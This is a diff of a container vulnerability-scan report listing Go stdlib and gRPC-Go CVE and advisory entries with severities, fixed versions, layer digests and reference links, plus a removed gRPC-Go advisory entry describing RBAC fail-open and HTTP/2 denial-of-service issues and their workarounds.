+      │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+      │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
       │     ├ DataSource       ╭ ID  : govulndb 
       │     │                  ├ Name: The Go Vulnerability Database 
       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-      │     ├ Fingerprint     : sha256:cdd004daa98036153d58a755db0d88aa24cb5b7b6b7d803995dfe96d9c172b8b 
+      │     ├ Fingerprint     : sha256:e7485df842a7977773a885b9f5955987cb76a8334872fc2af57f5b8a6a1964f0 
       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained, unsafe by design, and
       │     │                   has known security issues 
       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design, has numerous known
@@ -7947,112 +7542,7 @@
       │     ├ Severity        : UNKNOWN 
       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
-      ├ [1] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
-      │     ├ PkgID           : google.golang.org/grpc@v1.80.0 
-      │     ├ PkgName         : google.golang.org/grpc 
-      │     ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.80.0 
-      │     │                  ╰ UID : c6d370e1e94988e1 
-      │     ├ InstalledVersion: v1.80.0 
-      │     ├ FixedVersion    : 1.82.1 
-      │     ├ Status          : fixed 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
-      │     ├ SeveritySource  : ghsa 
-      │     ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
-      │     ├ DataSource       ╭ ID  : ghsa 
-      │     │                  ├ Name: GitHub Security Advisory Go 
-      │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
-      │     ├ Fingerprint     : sha256:7bf91140d15e7ee494f7288ba7b65d394c58e7c316ba9d38a14d11b7c4e21295 
-      │     ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
-      │     ├ Description     : Multiple security vulnerabilities have been identified and addressed in grpc-go
-      │     │                    affecting the xDS RBAC authorization engine (internal/xds/rbac) and the HTTP/2
-      │     │                    transport server implementation (internal/transport). These vulnerabilities
-      │     │                   could result in:
-      │     │                   
-      │     │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC policies
-      │     │                   containing `Metadata` or `RequestedServerName` fields.
-      │     │                   - Denial of Service (High CPU Consumption) due to an HTTP/2 Rapid Reset
-      │     │                   mitigation bypass during client-initiated stream resets.
-      │     │                   - Denial of Service (Server Panic) when parsing crafted xDS RBAC policies
-      │     │                   containing `NOT` rules around unsupported fields.
-      │     │                   ### Impact
-      │     │                   _What kind of vulnerability is it? Who is impacted?_
-      │     │                   #### xDS RBAC Authorization Bypass via `Metadata` & `RequestedServerName`
-      │     │                   matchers
-      │     │                   - Affected Component: xDS RBAC 
-      │     │                   - Impact: When building policy matchers for gRPC RBAC from xDS configurations,
-      │     │                   unsupported `permission` and `principal` rules (specifically `Metadata` and
-      │     │                   `RequestedServerName`) were silently ignored and treated as no-ops.
-      │     │                     - If an authorization policy relied purely on these matchers for access
-      │     │                   control, treating those rules as no-ops effectively removed the restrictions.
-      │     │                   - If these unsupported rules were nested inside logical `NOT` rules
-      │     │                   (`Permission_NotRule` / `Principal_NotId`) or multi-condition `OR/AND` rules,
-      │     │                   silently dropping them changed the boolean logic flow of the authorization
-      │     │                   engine.
-      │     │                   As a result, policy evaluation decisions could fail open, allowing unauthorized
-      │     │                    clients to access protected gRPC services or resources.
-      │     │                   #### HTTP/2 Rapid Reset Mitigation Bypass / Denial of Service via Stream
-      │     │                   Aborts
-      │     │                   - Affected Component: HTTP/2 transport
-      │     │                   - Impact: Earlier mitigations in grpc-go for HTTP/2 Rapid Reset only applied
-      │     │                   threshold checks to items that directly resulted in control frames being
-      │     │                   written back to the wire, such as `SETTINGS` ACKs or server-initiated
-      │     │                   `RST_STREAM`s.
-      │     │                   When a client initiated a rapid flood of stream creation (`HEADERS`)
-      │     │                   immediately followed by stream termination `RST_STREAM`, items queued up in the
-      │     │                    control buffer without counting against the transport response frame
-      │     │                   threshold. An attacker can repeatedly trigger this flood sequence to bypass
-      │     │                   reader blocking, resulting in high CPU usage, and Denial of Service (DoS).
-      │     │                   #### Denial of Service (Panic) in xDS RBAC Engine via Unsupported Fields inside
-      │     │                    NOT Rules
-      │     │                   - Impact: The xDS RBAC policy translators recursively generate matchers for
-      │     │                   nested rules. When a `NOT` rule wrapped an unsupported or unhandled field (such
-      │     │                    as `SourcedMetadata`), the recursive step returned an empty matcher. This
-      │     │                   could result in a runtime panic when the RBAC engine attempts to authorize an
-      │     │                   incoming request.
-      │     │                   An attacker or misconfigured/malicious xDS management server delivering an
-      │     │                   LDS/RDS update containing a `NOT` rule around an unhandled field causes the
-      │     │                   gRPC server process to crash immediately (CWE-248 / Denial of Service).
-      │     │                   ### Patches
-      │     │                   _Has the problem been patched? What versions should users upgrade to?_
-      │     │                   All three issues have been fixed in `master` and will be released in 1.82.1
-      │     │                   shortly.
-      │     │                   ### Workarounds
-      │     │                   _Is there a way for users to fix or remediate the vulnerability without
-      │     │                   upgrading?_
-      │     │                   If upgrading grpc-go immediately is not possible, apply the following
-      │     │                   workarounds based on your deployment architecture:
-      │     │                   * For xDS RBAC Vulnerabilities & Panics: Ensure that upstream xDS management
-      │     │                   servers do not push RBAC policies containing `Metadata`, `RequestedServerName`,
-      │     │                    or `NOT` rules wrapping unsupported fields (such as `SourcedMetadata`) to
-      │     │                   grpc-go servers.
-      │     │                   * For HTTP/2 Rapid Reset DOS: Configure upstream reverse proxies or load
-      │     │                   balancers (such as Envoy) with strict HTTP/2 `max_concurrent_streams` limits
-      │     │                   and active rate limiting on `RST_STREAM` frequency per connection.
-      │     │                   ### Severity
-      │     │                     | Vulnerability | Qualitative Severity | Approximate CVSS v3.1 Score |
-      │     │                   Primary Impact |
-      │     │                     | :--- | :--- | :--- | :--- |
-      │     │                     | **xDS RBAC Authorization Bypass** | **High** | `8.2` | Unauthorized Access
-      │     │                   / Fail-Open |
-      │     │                     | **HTTP/2 Rapid Reset DOS Bypass** | **High** | `7.5` | High CPU Consumption
-      │     │                    / Denial of Service |
-      │     │                     | **xDS RBAC Engine Server Panic** | **Medium** | `5.9` | Process Crash /
-      │     │                   Denial of Service | 
-      │     ├ Severity        : HIGH 
-      │     ├ VendorSeverity   ─ ghsa: 3 
-      │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/S
-      │     │                         │            A:N 
-      │     │                         ╰ V40Score : 8.8 
-      │     ├ References       ╭ [0]: https://github.com/grpc/grpc-go 
-      │     │                  ├ [1]: https://github.com/grpc/grpc-go/commit/4ea465d4ab98013f72a142fe0fc89c1977
-      │     │                  │      0b2935 
-      │     │                  ├ [2]: https://github.com/grpc/grpc-go/pull/9236 
-      │     │                  ├ [3]: https://github.com/grpc/grpc-go/releases/tag/v1.82.1 
-      │     │                  ╰ [4]: https://github.com/grpc/grpc-go/security/advisories/GHSA-hrxh-6v49-42gf 
-      │     ├ PublishedDate   : 2026-07-21T22:03:55Z 
-      │     ╰ LastModifiedDate: 2026-07-21T22:03:56Z 
-      ├ [2] ╭ VulnerabilityID : CVE-2026-27145 
+      ├ [1] ╭ VulnerabilityID : CVE-2026-27145 
       │     ├ VendorIDs        ─ [0]: GO-2026-5037 
       │     ├ PkgID           : stdlib@v1.26.3 
       │     ├ PkgName         : stdlib 
@@ -8061,13 +7551,13 @@
       │     ├ InstalledVersion: v1.26.3 
       │     ├ FixedVersion    : 1.25.11, 1.26.4 
       │     ├ Status          : fixed 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+      │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+      │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-27145 
       │     ├ DataSource       ╭ ID  : govulndb 
       │     │                  ├ Name: The Go Vulnerability Database 
       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-      │     ├ Fingerprint     : sha256:8a78c85b24a632e8fa4bb3f8ca8cd111aa837a29b3104959885f394815e6053c 
+      │     ├ Fingerprint     : sha256:ed53e16a4eadc5eaae9d00e07d1b7d021b366322e7b976a9bc25e4fc36734fdf 
       │     ├ Title           : crypto/x509: golang: golang crypto/x509: Denial of Service via excessive
       │     │                   processing of DNS SAN entries 
       │     ├ Description     : (*x509.Certificate).VerifyHostname previously called matchHostnames in a loop
@@ -8128,13 +7618,13 @@
       │     │                  ├ [36]: https://access.redhat.com/errata/RHSA-2026:47735 
       │     │                  ├ [37]: https://access.redhat.com/errata/RHSA-2026:47737 
       │     │                  ├ [38]: https://access.redhat.com/security/cve/CVE-2026-27145 
-      │     │                  ├ [39]: https://bugzilla.redhat.com/2445356 
+      │     │                  ├ [39]: https://bugzilla.redhat.com/2480756 
       │     │                  ├ [40]: https://bugzilla.redhat.com/2484207 
       │     │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2445356 
       │     │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
       │     │                  ├ [43]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-25679 
       │     │                  ├ [44]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
-      │     │                  ├ [45]: https://errata.almalinux.org/9/ALSA-2026-36317.html 
+      │     │                  ├ [45]: https://errata.almalinux.org/10/ALSA-2026-46395.html 
       │     │                  ├ [46]: https://errata.rockylinux.org/RLSA-2026:36317 
       │     │                  ├ [47]: https://go.dev/cl/783621 
       │     │                  ├ [48]: https://go.dev/issue/79694 
@@ -8148,7 +7638,7 @@
       │     │                  ╰ [55]: https://www.cve.org/CVERecord?id=CVE-2026-27145 
       │     ├ PublishedDate   : 2026-06-02T23:16:35.57Z 
       │     ╰ LastModifiedDate: 2026-07-31T13:17:40.873Z 
-      ├ [3] ╭ VulnerabilityID : CVE-2026-39822 
+      ├ [2] ╭ VulnerabilityID : CVE-2026-39822 
       │     ├ VendorIDs        ─ [0]: GO-2026-4970 
       │     ├ PkgID           : stdlib@v1.26.3 
       │     ├ PkgName         : stdlib 
@@ -8157,13 +7647,13 @@
       │     ├ InstalledVersion: v1.26.3 
       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
       │     ├ Status          : fixed 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+      │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+      │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39822 
       │     ├ DataSource       ╭ ID  : govulndb 
       │     │                  ├ Name: The Go Vulnerability Database 
       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-      │     ├ Fingerprint     : sha256:5ef45c223a7faae0131693e32a132dc0941b43613cd6a7ad72d51345544eac00 
+      │     ├ Fingerprint     : sha256:1c005204dfca69715fcc2267fe52c50edc71b7fdd31dbe523d8c9dd3a4dfd399 
       │     ├ Title           : os: golang: Go os.Root: Symlink following vulnerability allows directory
       │     │                   traversal 
       │     ├ Description     : On Unix systems, opening a file in an os.Root improperly follows symlinks to
@@ -8183,12 +7673,12 @@
       │     │                  │         ╰ V3Score : 7.8 
       │     │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H 
       │     │                            ╰ V3Score : 7.8 
-      │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38878 
+      │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:38495 
       │     │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-39822 
       │     │                  ├ [2] : https://bugzilla.redhat.com/2498152 
       │     │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2498152 
       │     │                  ├ [4] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39822 
-      │     │                  ├ [5] : https://errata.almalinux.org/9/ALSA-2026-38878.html 
+      │     │                  ├ [5] : https://errata.almalinux.org/10/ALSA-2026-38495.html 
       │     │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
       │     │                  ├ [7] : https://go.dev/cl/797880 
       │     │                  ├ [8] : https://go.dev/issue/79005 
@@ -8200,7 +7690,7 @@
       │     │                  ╰ [14]: https://www.cve.org/CVERecord?id=CVE-2026-39822 
       │     ├ PublishedDate   : 2026-07-08T17:17:21.31Z 
       │     ╰ LastModifiedDate: 2026-07-13T14:54:26.317Z 
-      ├ [4] ╭ VulnerabilityID : CVE-2026-42504 
+      ├ [3] ╭ VulnerabilityID : CVE-2026-42504 
       │     ├ VendorIDs        ─ [0]: GO-2026-5038 
       │     ├ PkgID           : stdlib@v1.26.3 
       │     ├ PkgName         : stdlib 
@@ -8209,13 +7699,13 @@
       │     ├ InstalledVersion: v1.26.3 
       │     ├ FixedVersion    : 1.25.11, 1.26.4 
       │     ├ Status          : fixed 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+      │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+      │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42504 
       │     ├ DataSource       ╭ ID  : govulndb 
       │     │                  ├ Name: The Go Vulnerability Database 
       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-      │     ├ Fingerprint     : sha256:bf74ff926d44317a7fa2b553599ee3be48d4d5ffdacaa6726fe53f6c44fd8eca 
+      │     ├ Fingerprint     : sha256:8228a144f0c071671c049265305854157f75b2775689a340cb0e6c990fce46f0 
       │     ├ Title           : mime: golang: Golang MIME: Denial of Service via maliciously-crafted MIME header 
       │     ├ Description     : Decoding a maliciously-crafted MIME header containing many invalid
       │     │                   encoded-words can consume excessive CPU. 
@@ -8238,7 +7728,7 @@
       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42504 
       │     ├ PublishedDate   : 2026-06-02T23:16:37.927Z 
       │     ╰ LastModifiedDate: 2026-07-22T19:10:00.12Z 
-      ├ [5] ╭ VulnerabilityID : CVE-2026-42505 
+      ├ [4] ╭ VulnerabilityID : CVE-2026-42505 
       │     ├ VendorIDs        ─ [0]: GO-2026-5856 
       │     ├ PkgID           : stdlib@v1.26.3 
       │     ├ PkgName         : stdlib 
@@ -8247,13 +7737,13 @@
       │     ├ InstalledVersion: v1.26.3 
       │     ├ FixedVersion    : 1.25.12, 1.26.5, 1.27.0-rc.2 
       │     ├ Status          : fixed 
-      │     ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-      │     │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+      │     ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+      │     │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42505 
       │     ├ DataSource       ╭ ID  : govulndb 
       │     │                  ├ Name: The Go Vulnerability Database 
       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
-      │     ├ Fingerprint     : sha256:a68a1d5f0ef6f64cd4a6e8e064128c7a84163de306810de12c908d3efc02e266 
+      │     ├ Fingerprint     : sha256:8c67b8d253e944ced055eb430d3a14d351b5c8cbacd3336e8c8c51b3e959f29c 
       │     ├ Title           : crypto/tls: golang: Go crypto/tls: Information disclosure in Encrypted Client
       │     │                   Hello 
       │     ├ Description     : Handshakes which used Encrypted Client Hello could be de-anonymized by a
@@ -8277,7 +7767,7 @@
       │     │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-42505 
       │     ├ PublishedDate   : 2026-07-08T17:17:21.497Z 
       │     ╰ LastModifiedDate: 2026-07-13T17:05:36.303Z 
-      ╰ [6] ╭ VulnerabilityID : CVE-2026-42507 
+      ╰ [5] ╭ VulnerabilityID : CVE-2026-42507 
             ├ VendorIDs        ─ [0]: GO-2026-5039 
             ├ PkgID           : stdlib@v1.26.3 
             ├ PkgName         : stdlib 
@@ -8286,13 +7776,13 @@
             ├ InstalledVersion: v1.26.3 
             ├ FixedVersion    : 1.25.11, 1.26.4 
             ├ Status          : fixed 
-            ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
-            │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
+            ├ Layer            ╭ Digest: sha256:049109992c9ae0dfd90316c8600962b4fb77125b30d7ba6b06a08b71af1d7a82 
+            │                  ╰ DiffID: sha256:91870971e3de5f047ff9b99b5877d59adc5ecba151af75cefa0d3d2f183c0c98 
             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42507 
             ├ DataSource       ╭ ID  : govulndb 
             │                  ├ Name: The Go Vulnerability Database 
             │                  ╰ URL : https://pkg.go.dev/vuln/ 
-            ├ Fingerprint     : sha256:e4464145479aa78d5453edf5c5564195e1d0b0c28f8933b615139536751c9443 
+            ├ Fingerprint     : sha256:2c3d139b4ce3f502a5b89d2188532c08242d9b20831a0dbed3b11cc5cbfbdf95 
             ├ Title           : net/textproto: golang: Golang net/textproto: Misleading error messages via
             │                   input injection 
             ├ Description     : When returning errors, functions in the net/textproto package would include its
@@ -8309,14 +7799,14 @@
             │                  │         ╰ V3Score : 5.3 
             │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N 
             │                            ╰ V3Score : 5.3 
-            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29981 
+            ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:29980 
             │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-42507 
             │                  ├ [2] : https://bugzilla.redhat.com/2484205 
             │                  ├ [3] : https://bugzilla.redhat.com/show_bug.cgi?id=2484205 
             │                  ├ [4] : https://bugzilla.redhat.com/show_bug.cgi?id=2484207 
             │                  ├ [5] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27145 
             │                  ├ [6] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42507 
-            │                  ├ [7] : https://errata.almalinux.org/9/ALSA-2026-29981.html 
+            │                  ├ [7] : https://errata.almalinux.org/10/ALSA-2026-29980.html 
             │                  ├ [8] : https://errata.rockylinux.org/RLSA-2026:29981 
             │                  ├ [9] : https://go.dev/cl/777060 
             │                  ├ [10]: https://go.dev/issue/79346 
